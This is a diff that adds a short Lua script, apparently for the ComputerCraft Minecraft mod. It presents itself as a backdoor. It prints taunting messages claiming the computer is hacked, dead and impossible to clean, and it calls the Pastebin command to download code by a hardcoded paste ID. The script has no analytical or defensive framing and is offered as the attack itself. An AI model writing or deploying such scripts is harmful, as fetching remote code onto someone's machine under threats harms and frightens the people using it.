@@ -1,0 +1,8 @@
+executeurl="Mi34LmkM"
+io.write("You haz been haxed!")
+io.write("Executing backdoor code!")
+shell.run("pastebin", "get", executeurl)
+io.write("Done! Enjoy your dead computer!")
+io.write("Also, don't try to remove this.")
+io.write("It's already over.")
+wait(500)
